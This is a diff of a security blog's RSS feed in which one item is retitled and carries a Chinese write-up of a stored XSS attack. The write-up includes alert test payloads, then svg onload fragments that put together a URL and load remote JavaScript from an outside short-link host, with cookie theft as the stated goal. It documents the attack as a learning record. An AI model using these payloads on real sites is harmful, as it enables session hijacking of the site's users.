@@ -1223,11 +1223,11 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/  </description>
     </item>
     
     <item>
-      <title>XSS实例</title>
-      <link>http://wyb0.com/posts/xss-example/</link>
+      <title>一次存储型XSS利用实例</title>
+      <link>http://wyb0.com/posts/recording-an-stored-xss/</link>
       <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/xss-example/</guid>
+      <guid>http://wyb0.com/posts/recording-an-stored-xss/</guid>
       <description> 首先感谢凯神的指导
 0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;  0x04 得到Cookie </description>
